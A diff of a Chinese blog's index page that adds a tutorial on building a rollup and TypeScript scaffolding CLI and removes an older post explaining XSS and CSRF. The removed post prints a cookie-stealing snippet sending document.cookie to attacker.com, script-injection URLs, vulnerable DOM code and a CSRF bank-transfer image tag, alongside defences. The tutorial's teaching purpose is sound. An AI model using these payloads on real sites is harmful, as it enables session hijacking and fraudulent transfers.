@@ -264,6 +264,163 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yokiyokiyoki.github.io/blog/blog/2019/03/25/study-cli-02/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yoki">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/blog/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/blog/2019/03/25/study-cli-02/" itemprop="url">前端如何搭建一个成熟的脚手架</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-25T15:20:12+08:00">
+                2019-03-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有了之前的基础，我们现在可以讲讲一个成熟的脚手架是怎么做了。vue-cli作为vue的脚手架，给如此多的前端开发者使用，已经算是成熟了吧。<br>这里我们参考vue-cli的源码，基于rollup和typescript一步步搭建。</p>
+<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><blockquote>
+<p>以下我们的命令仍然是ds~,模板是ds-cli-lib-template</p>
+</blockquote>
+<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">├─ bin            # 打包文件目录</span><br><span class="line">│  ├─ ds.js       # package.json里的bin字段引用文件 </span><br><span class="line">├─ src</span><br><span class="line">│  ├─ lib         # 具体命令目录</span><br><span class="line">│     ├─ list     # ds list</span><br><span class="line">│     ├─ init     # ds init</span><br><span class="line">│  ├─ utils       # 工具函数</span><br><span class="line">├─ main.ts        # 入口文件</span><br><span class="line">├─ typings        # typescript类型文件目录</span><br><span class="line">├─ rullup.config.js # rollpu构建配置</span><br><span class="line">├── test            #  测试用例</span><br></pre></td></tr></table></figure>
+<h3 id="编写构建配置"><a href="#编写构建配置" class="headerlink" title="编写构建配置"></a>编写构建配置</h3><p>现如今，webpack用来开发应用（热更新hmr,代码拆分等）,rollup用来开发类库（简单易上手，打包后代码能读懂，至于其他的特性webpack基本已支持）。<br>现在来明确我们的需求</p>
+<ul>
+<li>使用typescript编写模块代码</li>
+<li>打包成umd模块规范的代码</li>
+<li>可以引用commonjs规范的包（因为历史原因，大多数包都不是ES模块规范）</li>
+<li>压缩打包代码，减少体积</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rollup.config.js</span></span><br><span class="line"><span class="keyword">import</span> typescript <span class="keyword">from</span> <span class="string">"rollup-plugin-typescript2"</span>;</span><br><span class="line"><span class="keyword">import</span> commonjs <span class="keyword">from</span> <span class="string">'rollup-plugin-commonjs'</span></span><br><span class="line"><span class="keyword">import</span> &#123; uglify &#125; <span class="keyword">from</span> <span class="string">'rollup-plugin-uglify'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="comment">//入口文件</span></span><br><span class="line">  input: <span class="string">"src/main.ts"</span>,</span><br><span class="line">  output: [</span><br><span class="line">    &#123;</span><br><span class="line">      banner: <span class="string">"#!/usr/bin/env node"</span>,</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * 头部插入这段代码</span></span><br><span class="line"><span class="comment">       * */</span></span><br><span class="line">      name: <span class="string">"ds"</span>,</span><br><span class="line">      file: <span class="string">"bin/ds.js"</span>,</span><br><span class="line">      <span class="comment">//打包成umd模块规范</span></span><br><span class="line">      format: <span class="string">"umd"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  plugins: [</span><br><span class="line">    typescript(),</span><br><span class="line">    commonjs(&#123;</span><br><span class="line">      include: <span class="string">"node_modules/**"</span>,</span><br><span class="line">      extensions: [<span class="string">'.js'</span>, <span class="string">'.ts'</span>]</span><br><span class="line">    &#125;),</span><br><span class="line">    uglify()</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>npm脚本命令(“scripts”字段)<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"clean"</span>: <span class="string">"rm -rf ./bin &amp;&amp; mkdir bin"</span>,</span><br><span class="line"><span class="attr">"build"</span>: <span class="string">"npm run clean &amp;&amp; rollup --config"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="编写入口文件"><a href="#编写入口文件" class="headerlink" title="编写入口文件"></a>编写入口文件</h3><blockquote>
+<p>是一些非常基础的东西，我们一般不放很复杂的逻辑在入口文件里。</p>
+</blockquote>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cmd = <span class="built_in">require</span>(<span class="string">'commander'</span>);</span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'../package.json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里cli-init.ts和cli-list.ts我们可以简单导出一个函数，如</span></span><br><span class="line"><span class="comment">// export default function(...args) &#123;</span></span><br><span class="line"><span class="comment">//     console.log('init')</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">import</span> init <span class="keyword">from</span> <span class="string">'./lib/init/cli-init'</span>; </span><br><span class="line"><span class="keyword">import</span> list <span class="keyword">from</span> <span class="string">'./lib/list/cli-list'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> command= &#123;</span><br><span class="line">    init,</span><br><span class="line">    list</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//map对应的type，从而执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="keyword">type</span>, ...args</span>) </span>&#123;</span><br><span class="line">    config.debug = args[<span class="number">0</span>].debug;</span><br><span class="line">    command[<span class="keyword">type</span>](...args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd</span><br><span class="line">  .usage(<span class="string">'&lt;command&gt;'</span>)</span><br><span class="line">  .version(config.version)</span><br><span class="line">  .description(<span class="string">'欢迎使用ds-cli'</span>);</span><br><span class="line"></span><br><span class="line">cmd</span><br><span class="line">  .command(<span class="string">'init'</span>)</span><br><span class="line">  .description(<span class="string">'初始化组件模板'</span>)</span><br><span class="line">  .action(<span class="function">(<span class="params">...args</span>) =&gt;</span> exec(<span class="string">'init'</span>, ...args));</span><br><span class="line"></span><br><span class="line">cmd</span><br><span class="line">  .command(<span class="string">'list'</span>)</span><br><span class="line">  .description(<span class="string">'查看线上组件模板'</span>)</span><br><span class="line">  .action(<span class="function">(<span class="params">...args</span>) =&gt;</span> exec(<span class="string">'list'</span>, ...args));</span><br><span class="line"></span><br><span class="line">cmd.command(<span class="string">'help'</span>)</span><br><span class="line">  .description(<span class="string">'查看帮助'</span>)</span><br><span class="line">  .action(<span class="function"><span class="params">()</span> =&gt;</span> cmd.help());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析输入的参数</span></span><br><span class="line">cmd.parse(process.argv);</span><br><span class="line"><span class="keyword">if</span> (!cmd.args.length) &#123;</span><br><span class="line"></span><br><span class="line">  cmd.help();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们打包到bin文件夹下后，配置一下package.json的bin字段为bin/ds.js，然后发布npm试一下命令。如果失败，请重新审视上述流程。</p>
+<h3 id="初始化模板"><a href="#初始化模板" class="headerlink" title="初始化模板"></a>初始化模板</h3><h4 id="我们对模板的要求"><a href="#我们对模板的要求" class="headerlink" title="我们对模板的要求"></a>我们对模板的要求</h4><ul>
+<li>文件目录必须含有template文件夹，并且所需模板文件放在该目录下</li>
+<li>文件名命名规范是ds-cli-‘name’-template，方便脚手架拉取</li>
+<li>可用meta.js提高自定义程度（所谓动态化模板）</li>
+</ul>
+<h4 id="期望命令"><a href="#期望命令" class="headerlink" title="期望命令"></a>期望命令</h4><p>ds init <template-name> <app-name></app-name></template-name></p>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(当前目录下构建)&#123;</span><br><span class="line">    询问一下是不是当前目录,是的话进入run函数</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    进入主流程run函数</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//run函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(模板路径是本地文件路径)&#123;</span><br><span class="line">        <span class="comment">//支持本地模板如ds init /usr/webpack test</span></span><br><span class="line">        <span class="keyword">if</span>(路径存在)&#123;</span><br><span class="line">            <span class="comment">//动态构造模板到你的目录如test</span></span><br><span class="line">            generate()</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//报错日志</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//1.检查当前process的node版本，大于6才可以用</span></span><br><span class="line">        <span class="comment">//2.检查当前package.json的版本，跟远程仓库的版本比较一下。如果不一样,就提醒一下用户有新版本</span></span><br><span class="line">        <span class="comment">//3.下载远程仓库到本地(本地一般存放用户目录里的.ds-template文件夹下)，然后执行generate函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="动态模板"><a href="#动态模板" class="headerlink" title="动态模板"></a>动态模板</h4><blockquote>
+<p>大家也看到了，其实最重要的就是generate函数~</p>
+</blockquote>
+<ul>
+<li>而如果我们去掉这一步generate模板的话，其实就是相当于下载一个静态模板，如果我们对于用户自定义没要求的话，其实可以跳过这一步。</li>
+<li><p>generate函数里面用到了metalsmith，这个就相当于我们之前用的gulp，通过不断地编写中间件来优化打包后的结果。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> opts = getOptions(name, templatePath) <span class="keyword">as</span> meta;  <span class="comment">// 获取meta.js配置,存到opts里</span></span><br><span class="line">    <span class="comment">// 我们把所需文件放在源文件的template目录下，其他一些如测试放在外面。初始化一下metalsmith</span></span><br><span class="line">    <span class="keyword">const</span> metalsmith = Metalsmith(path.join(templatePath, <span class="string">'template'</span>)) <span class="comment">//我们约定，将模板所有文件放在ds-cli-lib-template/template里</span></span><br><span class="line">    <span class="comment">//中间件</span></span><br><span class="line">     metalsmith.use(askQuestions(opts.prompts))  <span class="comment">// 询问问题，将信息存metalsmith.metadata()</span></span><br><span class="line">    .use(filterFiles(opts.filters))  <span class="comment">// 通过问题交互过滤掉不需要的文件</span></span><br><span class="line">    .use(renderTemplateFiles()); <span class="comment">// 模板里面可以使用handlebar语法，作为占位符，我们这里重新渲染模板文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 源目录打包到目标目录to</span></span><br><span class="line">    metalsmith.clean(<span class="literal">false</span>)</span><br><span class="line">    .source(<span class="string">'.'</span>) </span><br><span class="line">    .destination(to)</span><br><span class="line">    .build(<span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">      done(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我们在模板（如ds-cli-lib-template）目录下需要构造meta.js，自定义我们所需的字段</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="comment">//会通过中间件把这些字段存在metalsmith.metadata()，方便接下来的中间件调用</span></span><br><span class="line">    prompts:&#123;</span><br><span class="line">        <span class="comment">//格式可以参考https://github.com/SBoudrias/Inquirer.js/#question</span></span><br><span class="line">        name: &#123;</span><br><span class="line">            type: <span class="string">'string'</span>,</span><br><span class="line">            required: <span class="literal">true</span>,</span><br><span class="line">            message: <span class="string">'Project name'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        author: &#123;</span><br><span class="line">            type: <span class="string">'string'</span>,</span><br><span class="line">            message: <span class="string">'Author'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        description: &#123;</span><br><span class="line">            type: <span class="string">'string'</span>,</span><br><span class="line">            required: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">'Project description'</span>,</span><br><span class="line">            <span class="keyword">default</span>: <span class="string">'构建一个lib'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        lint: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"confirm"</span>,</span><br><span class="line">            <span class="string">"message"</span>: <span class="string">"是否用tslint"</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    filters: &#123;</span><br><span class="line">        <span class="comment">//当上面prompts的lint为false的时候，就过滤掉文件</span></span><br><span class="line">        <span class="string">"tslint.json"</span>: <span class="string">"lint"</span>,</span><br><span class="line">        <span class="string">"tsconfig.json"</span>: <span class="string">"lint"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://yokiyokiyoki.github.io/blog/blog/2019/02/26/geek-self-cultivation/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1752,195 +1909,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://yokiyokiyoki.github.io/blog/blog/2018/07/09/study-xss-csrf/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Yoki">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/blog/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/blog/2018/07/09/study-xss-csrf/" itemprop="url">xss和csrf</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T11:02:34+08:00">
-                2018-07-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><blockquote>
-<p>cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）</p>
-</blockquote>
-<ul>
-<li>主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。</li>
-</ul>
-<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><ul>
-<li>如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞</li>
-<li>显著特征是应用程序没有进行任何过滤和净化措施</li>
-</ul>
-<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><ul>
-<li>如果一个网站的错误消息是这样显示的，<a href="http://www.xxx.com/error.php?message=sorry,an" target="_blank" rel="noopener">www.xxx.com/error.php?message=sorry,an</a> error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户</li>
-<li><p><a href="http://www.xxx.com/error.php?message=" target="_blank" rel="noopener">www.xxx.com/error.php?message=</a><script>alert 的写法(1)</script>，当用户打开错误页面的时候，就会出现</p><p><script>alert 的写法(1)</script></p>，弹出一个消息框<p></p>
-</li>
-<li><p>当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。</p>
-</li>
-<li>截获用户的会话后，就可以访问该用户授权访问的所有数据和功能</li>
-<li>比如攻击构造这样一个 url，message 信息如下</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="keyword">new</span> Image();</span><br><span class="line">i.src = <span class="string">"http://attacker.com?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。</li>
-</ul>
-<h2 id="保存型"><a href="#保存型" class="headerlink" title="保存型"></a>保存型</h2><ul>
-<li>脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户</li>
-<li>与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行</li>
-<li>与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。</li>
-<li>如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了</li>
-</ul>
-<h2 id="基于-dom-的-xss-漏洞"><a href="#基于-dom-的-xss-漏洞" class="headerlink" title="基于 dom 的 xss 漏洞"></a>基于 dom 的 xss 漏洞</h2><ul>
-<li>前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的</li>
-</ul>
-<h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> url = <span class="built_in">document</span>.location;</span><br><span class="line"><span class="keyword">let</span> message = <span class="regexp">/message=(.+)$/</span>.exec(url)[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">document</span>.write(message);</span><br><span class="line"><span class="comment">// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;，也可以展开xss漏洞攻击</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。</li>
-</ul>
-<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
-<li>过滤一些关键字</li>
-<li>Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；设置 http-only（不能用 js 脚本进行获取）</li>
-</ul>
-<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><blockquote>
-<p>cross site request forgery 的缩写，即跨站脚本请求伪造</p>
-</blockquote>
-<ul>
-<li>顾名思义是伪造请求冒充用户在站内的正常操作。</li>
-<li>我们知道绝大多数网站是通过 cookie 等方式辨识用户身份（包括服务器端 session 的网站，因为 session id 大多也是保存在 cookie），再予以授权。</li>
-<li>所以要伪造用户的正常操作，最好是通过 xss 或者链接欺骗等途径，让用户再本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求（xss 是实现 csrf 的手段之一）</li>
-</ul>
-<h2 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h2><ul>
-<li>一论坛网站的发帖是通过 get 请求访问，点击发帖之后 js 把发帖内容拼接成目标 url 并访问：<a href="http://example.com/bbs/create_post.php?title=标题&amp;content=内容" target="_blank" rel="noopener">http://example.com/bbs/create_post.php?title=标题&amp;content=内容</a></li>
-<li>那么我在论坛发一贴<a href="http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。" target="_blank" rel="noopener">http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。</a></li>
-<li>如果一家银行用以执行转账操作的 url 为 <a href="http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：" target="_blank" rel="noopener">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：</a><img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman"></li>
-<li>如果有账户名为 alice 的用户访问了恶意站点，而她之前也刚访问过银行不久，登陆信息尚未过期，那么她就会损失 1000 元</li>
-</ul>
-<h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
-<li><p>如何解决这个问题，过滤用户输入，不允许发布这种含有站内操作 url 的链接，这么做可能有点用，但是阻挡不了 csrf，因为攻击者可以通过 qq 发布这个链接，这样点击到这个链接的用户一样会中招。</p>
-</li>
-<li><p>所以对待 csrf，我们的视角需要和对待 xss 有所不同。csrf 不一定要有站内的输入，因为他不属于注入攻击，而是属于请求伪造。被伪造的请求可以是任何来源，而非一定是站内。</p>
-</li>
-<li><p>过滤请求的处理者</p>
-<ul>
-<li>检查 Referer 字段：可以检查是否来源于该域名（但是请求者是可以更改 http 请求头的，他可以给这个任何值）</li>
-<li>添加校验 token：也就是请求令牌，由于 csrf 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求再访问敏感数据请求的时候，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法执行 csrf 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求的时候，这个伪乱数也一并提交上去校验。</li>
-</ul>
-</li>
-<li>改良站内 api 的设计，对于发布帖子这类创建资源的操作，应该只接受 post 请求，而 get 请求应该只浏览。最好是采用 RESTFUL 风格设计。</li>
-</ul>
-<h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><ul>
-<li><a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="noopener">总结 xss 与 csrf 两种跨站攻击</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1993,7 +1961,7 @@
               
                 <a href="/blog/archives/">
               
-                  <span class="site-state-item-count">77</span>
+                  <span class="site-state-item-count">78</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
